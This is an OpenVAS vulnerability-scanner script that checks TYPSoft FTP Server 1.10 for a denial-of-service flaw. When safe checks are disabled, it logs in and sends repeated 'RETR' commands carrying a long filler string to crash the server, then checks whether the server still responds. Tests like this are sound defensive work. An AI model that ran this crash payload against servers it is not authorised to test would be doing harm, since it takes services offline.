###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_typesoft_ftp_40181.nasl 13475 2019-02-05 14:51:19Z cfischer $
#
# TYPSoft FTP Server 'RETR' Command Remote Denial Of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100641");
  script_version("$Revision: 13475 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-05 15:51:19 +0100 (Tue, 05 Feb 2019) $");
  script_tag(name:"creation_date", value:"2010-05-17 12:46:01 +0200 (Mon, 17 May 2010)");
  script_bugtraq_id(40181);

  script_name("TYPSoft FTP Server 'RETR' Command Remote Denial Of Service Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/40181");
  script_xref(name:"URL", value:"http://sourceforge.net/projects/ftpserv/");

  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"qod_type", value:"remote_banner");
  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/typsoft/detected");

  script_tag(name:"summary", value:"TYPSoft FTP Server is prone to a remote denial-of-service
  vulnerability.");

  script_tag(name:"impact", value:"Successful attacks will cause the application to crash,
  creating a denial-of- service condition.");

  script_tag(name:"affected", value:"TYPSoft FTP Server 1.10 is vulnerable. Other versions may also
  be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("ftp_func.inc");
include("version_func.inc");

ftpPort = get_ftp_port(default:21);
banner = get_ftp_banner(port:ftpPort);
if(!banner || "TYPSoft" >!< banner)
  exit(0);

if(safe_checks()) {
  version = eregmatch(pattern:"TYPSoft FTP Server ([0-9.]+)", string:banner);
  if(!version[1])
    exit(0);

  if(version_is_equal(version:version[1], test_version:"1.10")) {
    security_message(port:ftpPort);
    exit(0);
  }
} else {

  soc1 = open_sock_tcp(ftpPort);
  if(!soc1)
    exit(0);

  kb_creds = ftp_get_kb_creds();
  user = kb_creds["login"];
  pass = kb_creds["pass"];

  login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
  if(login_details)
  {
    data = crap(data:"A", length:2000);

    for(i=0;i<10;i++) {
      send(socket:soc1, data:string("RETR ",data,"\r\n"));
    }

    close(soc1);
    sleep(5);

    soc = open_sock_tcp(ftpPort);

    if(!ftp_recv_line(socket:soc)) {
      security_message(port:ftpPort);
      exit(0);
    }
  }
}

exit(0);